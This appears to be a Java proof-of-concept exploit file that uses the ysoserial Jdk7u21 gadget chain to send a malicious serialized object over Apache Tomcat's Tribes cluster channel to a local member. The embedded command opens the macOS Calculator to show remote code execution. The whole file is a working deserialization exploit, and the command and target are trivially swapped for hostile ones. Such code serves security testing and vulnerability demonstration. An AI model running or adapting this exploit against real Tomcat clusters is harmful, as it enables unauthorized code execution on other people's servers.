import java.io.*;

import org.apache.catalina.tribes.group.GroupChannel;
import org.apache.catalina.tribes.Member;
import  org.apache.catalina.tribes.membership.MemberImpl;
import org.apache.catalina.tribes.Channel;

import ysoserial.payloads.Jdk7u21;

public class test {
    public static void main(String[] args) throws Exception{
        Jdk7u21 j7u21 = new Jdk7u21();

        GroupChannel GC = new GroupChannel();
        GC.start(Channel.DEFAULT);
        MemberImpl member = new MemberImpl("127.0.0.1",4002,132431);
        GC.send(new Member[]{member},(Serializable) j7u21.getObject("open /Applications/Calculator.app/Contents/MacOS/Calculator"),8);
    }
}

